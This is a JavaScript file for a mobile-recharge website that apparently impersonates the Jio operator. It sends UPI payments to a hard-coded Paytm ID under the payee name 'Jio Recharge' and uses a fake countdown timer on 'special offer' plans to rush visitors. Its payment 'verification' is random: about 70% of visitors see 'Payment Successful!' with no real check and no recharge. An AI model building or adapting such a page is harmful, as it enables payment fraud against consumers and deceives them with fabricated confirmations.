// ==========================================
// Configuration - Update these values as needed
// ==========================================
const UPI_CONFIG = {
  vpa: "Paytm.s2vv2a7@pty", // Your UPI ID / VPA
  payeeName: "Jio Recharge", // Payee name shown in UPI app
  currency: "INR",
  transactionPrefix: "Recharge", // Transaction note prefix
};

// ==========================================
// Shared Utilities
// ==========================================
const getSafeAmount = (value, fallback = "239") => {
  const amount = String(value || "").replace(/\D/g, "");
  return amount || fallback;
};

const saveSelectedAmount = (amount) => {
  try {
    localStorage.setItem("selectedRechargeAmount", getSafeAmount(amount));
  } catch (error) {
    // Storage unavailable in strict/private modes.
  }
};

const getSavedAmount = () => {
  try {
    return localStorage.getItem("selectedRechargeAmount");
  } catch (error) {
    return "";
  }
};

// ==========================================
// Page Routing & Common Setup
// ==========================================
const currentPage = window.location.pathname.split("/").pop().toLowerCase();
const pageParams = new URLSearchParams(window.location.search);
const pageNumber = pageParams.get("number")?.replace(/\D/g, "").slice(0, 10) || "";
const operator = pageParams.get("operator") || "Jio";

// ==========================================
// Index Page Logic
// ==========================================
const rechargeButton = document.querySelector("#rechargeButton");
const rechargeHint = document.querySelector("#rechargeHint");
const rechargeNumberInput = document.querySelector("#mobileNumber");
const serviceButtons = document.querySelectorAll(".service-tabs button");

if (rechargeNumberInput) {
  rechargeNumberInput.addEventListener("input", () => {
    rechargeNumberInput.value = rechargeNumberInput.value.replace(/\D/g, "").slice(0, 10);
  });
}

if (rechargeButton) {
  rechargeButton.addEventListener("click", () => {
    const number = rechargeNumberInput?.value.trim() || "";
    const activeOperator = document.querySelector(".service-tabs button.active")?.dataset.operator || "Jio";

    if (number.length !== 10) {
      rechargeHint.textContent = "Please enter a valid 10 digit mobile number.";
      rechargeHint.classList.add("demo-message");
      rechargeNumberInput?.focus();
      return;
    }

    window.location.href = `plans.html?number=${encodeURIComponent(number)}&operator=${encodeURIComponent(activeOperator)}`;
  });
}

serviceButtons.forEach((button) => {
  button.addEventListener("click", () => {
    serviceButtons.forEach((item) => {
      item.classList.remove("active");
      item.setAttribute("aria-pressed", "false");
    });

    button.classList.add("active");
    button.setAttribute("aria-pressed", "true");

    if (rechargeHint) {
      rechargeHint.textContent = `${button.dataset.operator} prepaid mobile recharge selected.`;
      rechargeHint.classList.add("demo-message");
    }
  });
});

// ==========================================
// Plans Page Logic
// ==========================================
const rechargeNumber = document.querySelector("#rechargeNumber");
const offerTimer = document.querySelector("#offerTimer");
const planButtons = document.querySelectorAll(".plan-toggle button");
const planRechargeButtons = document.querySelectorAll(".plan-recharge-button");

if (currentPage === "plans.html" && pageNumber.length !== 10) {
  window.location.replace("index.html");
}

if (rechargeNumber) {
  rechargeNumber.textContent = pageNumber || "8102771005";
  document.title = `${operator} Special Offer Plans`;
}

if (offerTimer) {
  let seconds = 14 * 60 + 55;

  const renderOfferTimer = () => {
    const minutes = String(Math.floor(seconds / 60)).padStart(2, "0");
    const secs = String(seconds % 60).padStart(2, "0");
    offerTimer.textContent = `${minutes}:${secs}`;
    seconds = seconds > 0 ? seconds - 1 : 0;
  };

  renderOfferTimer();
  setInterval(renderOfferTimer, 1000);
}

planButtons.forEach((button) => {
  button.addEventListener("click", () => {
    planButtons.forEach((item) => item.classList.remove("selected"));
    button.classList.add("selected");
  });
});

const getSelectedPlanAmount = (button) => {
  const cardPrice = button.closest(".offer-plan-card")?.querySelector(".price-line strong")?.textContent;
  return getSafeAmount(cardPrice || button.dataset.amount);
};

planRechargeButtons.forEach((button) => {
  button.addEventListener("click", () => {
    const number = pageNumber || "";
    const amount = getSelectedPlanAmount(button);

    button.dataset.amount = amount;
    saveSelectedAmount(amount);
    window.location.href = `payment.html?amount=${encodeURIComponent(amount)}&number=${encodeURIComponent(number)}&operator=${encodeURIComponent(operator)}`;
  });
});

// ==========================================
// Payment Page Logic
// ==========================================
const payAmount = document.querySelector("#payAmount");
const paymentNote = document.querySelector("#paymentNote");
const upiOptions = document.querySelectorAll(".upi-option");
const upiOptionAmounts = document.querySelectorAll(".optionAmount");
const paymentBackButton = document.querySelector(".payment-header .back-button");
const detailsToggle = document.querySelector("#detailsToggle");
const detailsPanel = document.querySelector("#detailsPanel");
const detailNumber = document.querySelector("#detailNumber");
const detailOperator = document.querySelector("#detailOperator");
const verificationSection = document.querySelector("#verificationSection");
const statusCard = document.querySelector("#statusCard");
const statusIcon = document.querySelector("#statusIcon");
const statusTitle = document.querySelector("#statusTitle");
const statusMessage = document.querySelector("#statusMessage");
const progressBar = document.querySelector("#progressBar");
const progressFill = document.querySelector("#progressFill");
const qrModal = document.querySelector("#qrModal");
const qrClose = document.querySelector("#qrClose");
const qrCanvas = document.querySelector("#qrCanvas");
const qrAmount = document.querySelector("#qrAmount");
const qrDownload = document.querySelector(".qr-download");

// Payment back button
if (paymentBackButton) {
  paymentBackButton.href = pageNumber
    ? `plans.html?number=${encodeURIComponent(pageNumber)}&operator=${encodeURIComponent(operator)}`
    : "index.html";
}

// Details panel toggle
if (detailsToggle && detailsPanel) {
  detailsToggle.addEventListener("click", () => {
    const isExpanded = detailsToggle.getAttribute("aria-expanded") === "true";
    detailsToggle.setAttribute("aria-expanded", String(!isExpanded));
    detailsPanel.style.display = isExpanded ? "none" : "block";
    detailsToggle.innerHTML = isExpanded ? "Details ▼" : "Details ▲";
  });
}

// Amount input handling
if (payAmount) {
  const updateAmountDisplay = (raw) => {
    const amount = getSafeAmount(raw);
    saveSelectedAmount(amount);
    payAmount.value = amount;
    upiOptionAmounts.forEach((item) => {
      item.textContent = amount;
    });
    if (qrAmount) {
      qrAmount.textContent = amount;
    }
    document.title = `Pay ₹${amount} using UPI`;
  };

  payAmount.addEventListener("input", () => {
    updateAmountDisplay(payAmount.value);
  });

  payAmount.addEventListener("blur", () => {
    updateAmountDisplay(payAmount.value);
  });

  // Set initial amount from URL or localStorage
  const params = new URLSearchParams(window.location.search);
  updateAmountDisplay(params.get("amount") || getSavedAmount());

  // Update details panel
  if (detailNumber) {
    detailNumber.textContent = pageNumber || "8102771005";
  }
  if (detailOperator) {
    detailOperator.textContent = operator;
  }
}

// UPI Deep Link Generator
// Generates standard UPI payment intent URLs following the UPI specification
// Format: upi://pay?pa=<VPA>&pn=<payeeName>&am=<amount>&cu=<currency>&tn=<transactionNote>
const generateUpiLink = (vpa, payeeName, amount, currency = "INR", transactionNote = "") => {
  const params = new URLSearchParams({
    pa: vpa,
    pn: payeeName,
    cu: currency,
  });

  // Amount is optional in UPI deep links (user can edit in app)
  // Include it for convenience, but user can modify in their UPI app
  if (amount && amount !== "0") {
    params.set("am", amount);
  }

  // Transaction note for reference
  if (transactionNote) {
    params.set("tn", transactionNote);
  }

  return `upi://pay?${params.toString()}`;
};

// UPI Option Click Handler
upiOptions.forEach((option) => {
  option.addEventListener("click", async () => {
    const amount = getSafeAmount(payAmount?.value || getSavedAmount());
    const appName = option.querySelector("strong")?.textContent || "UPI app";
    const scheme = option.dataset.scheme || "upi://pay";
    const vpa = option.dataset.vpa || UPI_CONFIG.vpa;
    const name = option.dataset.name || UPI_CONFIG.payeeName;
    const app = option.dataset.app;

    // Prevent double-clicks
    if (option.classList.contains("loading")) {
      return;
    }

    // Special handling for QR code
    if (app === "qr") {
      showQrModal(amount, vpa);
      return;
    }

    // Set loading state
    option.classList.add("loading");
    if (paymentNote) {
      paymentNote.textContent = `Opening ${appName}... Please complete payment in the app.`;
    }

    // Generate UPI deep link
    const rechargeFor = pageNumber || "selected number";
    const transactionNote = `${UPI_CONFIG.transactionPrefix} ${rechargeFor}`;
    const upiLink = generateUpiLink(vpa, name, amount, UPI_CONFIG.currency, transactionNote);

    // For app-specific schemes, append UPI params
    let finalLink = upiLink;
    if (scheme !== "upi://pay") {
      // App-specific schemes like paytmmp://pay or phonepe://pay
      // Append UPI params as query string
      finalLink = `${scheme}?${new URLSearchParams({
        pa: vpa,
        pn: name,
        am: amount,
        cu: UPI_CONFIG.currency,
        tn: transactionNote,
      }).toString()}`;
    }

    // Open UPI app via deep link
    // Using iframe approach for better mobile compatibility
    const clickedAt = Date.now();

    try {
      // Attempt to open via iframe (more reliable on mobile)
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = finalLink;
      document.body.appendChild(iframe);

      // Fallback to window.location after timeout
      setTimeout(() => {
        if (iframe.parentNode) {
          document.body.removeChild(iframe);
        }
        // Only redirect if click was recent (user didn't return quickly)
        if (Date.now() - clickedAt < 2500) {
          window.location.href = finalLink;
        }
      }, 1500);
    } catch (error) {
      // Fallback to direct navigation
      window.location.href = finalLink;
    }

    // Start payment verification monitoring
    startPaymentVerification(amount, appName, option);
  });
});

// Payment Verification Flow
// Monitors when user returns from UPI app and simulates verification
// In production, replace this with actual backend verification API call
let verificationTimeout = null;
let visibilityChangeHandler = null;

const startPaymentVerification = (amount, appName, optionElement) => {
  // Clear any existing verification
  if (verificationTimeout) {
    clearTimeout(verificationTimeout);
  }
  if (visibilityChangeHandler) {
    document.removeEventListener("visibilitychange", visibilityChangeHandler);
  }

  // Show pending state
  showVerificationStatus("pending", "Payment Verification Pending", 
    `We are verifying your ₹${amount} payment with the bank via ${appName}. Please wait...`);

  // Monitor page visibility (user returns from UPI app)
  visibilityChangeHandler = () => {
    if (document.visibilityState === "visible") {
      // User returned to the page
      verifyPayment(amount, appName, optionElement);
    }
  };
  document.addEventListener("visibilitychange", visibilityChangeHandler);

  // Also set a timeout for verification (simulate backend check)
  verificationTimeout = setTimeout(() => {
    verifyPayment(amount, appName, optionElement);
  }, 30000); // 30 seconds timeout
};

// Simulate payment verification
// In production, this should call your backend API to check transaction status
const verifyPayment = async (amount, appName, optionElement) => {
  // Clean up listeners
  if (verificationTimeout) {
    clearTimeout(verificationTimeout);
    verificationTimeout = null;
  }
  if (visibilityChangeHandler) {
    document.removeEventListener("visibilitychange", visibilityChangeHandler);
    visibilityChangeHandler = null;
  }

  // Remove loading state from button
  if (optionElement) {
    optionElement.classList.remove("loading");
  }

  // Show loading state during verification
  showVerificationStatus("loading", "Verifying Payment...", 
    `Checking payment status with bank for ₹${amount}...`);

  // Simulate API call delay
  await new Promise(resolve => setTimeout(resolve, 2000));

  // ==========================================
  // PRODUCTION NOTE:
  // Replace this simulation with actual backend verification.
  // Call your payment gateway API to check transaction status.
  // Example:
  // const response = await fetch('/api/verify-payment', {
  //   method: 'POST',
  //   body: JSON.stringify({ vpa: UPI_CONFIG.vpa, amount, txnId: ... })
  // });
  // const result = await response.json();
  // ==========================================

  // For demo: randomly succeed or fail
  // In production, use actual verification result
  const isSuccess = Math.random() > 0.3; // 70% success rate for demo

  if (isSuccess) {
    showVerificationStatus("success", "Payment Successful!", 
      `Your payment of ₹${amount} via ${appName} has been verified. Thank you!`);
    
    // Disable all payment options after success
    document.querySelectorAll(".upi-option, .alt-option").forEach(btn => {
      btn.disabled = true;
      btn.style.opacity = "0.6";
      btn.style.pointerEvents = "none";
    });
  } else {
    showVerificationStatus("failed", "Payment Failed or Pending", 
      `We could not verify your payment of ₹${amount}. Please try again or contact support.`);
  }
};

// Show verification status with animation
const showVerificationStatus = (type, title, message) => {
  if (!verificationSection || !statusCard) return;

  // Reset classes
  statusCard.className = "status-card " + type;

  // Set content
  const icons = {
    pending: "⏳",
    loading: "🔄",
    success: "✅",
    failed: "❌"
  };

  statusIcon.textContent = icons[type] || "⏳";
  statusTitle.textContent = title;
  statusMessage.textContent = message;

  // Show/hide progress bar
  if (type === "loading" && progressBar && progressFill) {
    progressBar.style.display = "block";
    progressFill.style.width = "0%";
    
    // Animate progress
    let progress = 0;
    const interval = setInterval(() => {
      progress += 10;
      progressFill.style.width = progress + "%";
      if (progress >= 90) {
        clearInterval(interval);
      }
    }, 300);
  } else if (progressBar) {
    progressBar.style.display = "none";
    progressFill.style.width = "0%";
  }

  // Show section with animation
  verificationSection.style.display = "block";
  verificationSection.scrollIntoView({ behavior: "smooth", block: "center" });
};

// ==========================================
// QR Code Modal
// ==========================================
const showQrModal = (amount, vpa) => {
  if (!qrModal || !qrCanvas) return;

  // Show modal
  qrModal.style.display = "flex";
  document.body.style.overflow = "hidden";

  // Generate UPI QR data
  const rechargeFor = pageNumber || "selected number";
  const transactionNote = `${UPI_CONFIG.transactionPrefix} ${rechargeFor}`;
  const qrData = generateUpiLink(vpa, UPI_CONFIG.payeeName, amount, UPI_CONFIG.currency, transactionNote);

  // Clear previous QR
  qrCanvas.innerHTML = "";

  // Generate QR code using qrcode library
  if (typeof QRCode !== "undefined") {
    try {
      new QRCode(qrCanvas, {
        text: qrData,
        width: 200,
        height: 200,
        colorDark: "#000000",
        colorLight: "#ffffff",
        correctLevel: QRCode.CorrectLevel.M,
      });
    } catch (e) {
      // Fallback: show text if QR generation fails
      qrCanvas.parentElement.innerHTML = `
        <div style="padding: 2rem; text-align: center; word-break: break-all; font-size: 0.75rem; color: #666;">
          <p style="font-weight: 700; margin-bottom: 0.5rem;">Scan with UPI App</p>
          <p style="font-family: monospace;">${qrData}</p>
        </div>
      `;
    }
  } else {
    // Fallback if QR library not loaded
    qrCanvas.parentElement.innerHTML = `
      <div style="padding: 2rem; text-align: center; word-break: break-all; font-size: 0.75rem; color: #666;">
        <p style="font-weight: 700; margin-bottom: 0.5rem;">Scan with UPI App</p>
        <p style="font-family: monospace;">${qrData}</p>
      </div>
    `;
  }

  // Update amount display
  if (qrAmount) {
    qrAmount.textContent = amount;
  }

  // Store QR data for download
  qrModal.dataset.qrData = qrData;
};

const hideQrModal = () => {
  if (qrModal) {
    qrModal.style.display = "none";
    document.body.style.overflow = "";
  }
};

if (qrClose) {
  qrClose.addEventListener("click", hideQrModal);
}

if (qrModal) {
  qrModal.addEventListener("click", (e) => {
    if (e.target === qrModal) {
      hideQrModal();
    }
  });
}

if (qrDownload) {
  qrDownload.addEventListener("click", () => {
    const qrData = qrModal?.dataset.qrData;
    if (qrData && qrCanvas) {
      // Create download link
      const link = document.createElement("a");
      link.download = `upi-qr-${Date.now()}.png`;
      link.href = qrCanvas.toDataURL("image/png");
      link.click();
    }
  });
}

// ==========================================
// Keyboard Support
// ==========================================
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape" && qrModal && qrModal.style.display === "flex") {
    hideQrModal();
  }
});

// ==========================================
// Initial Page Setup
// ==========================================
if (currentPage === "payment.html") {
  document.title = `Pay ₹${getSafeAmount(pageParams.get("amount") || getSavedAmount())} using UPI`;
}
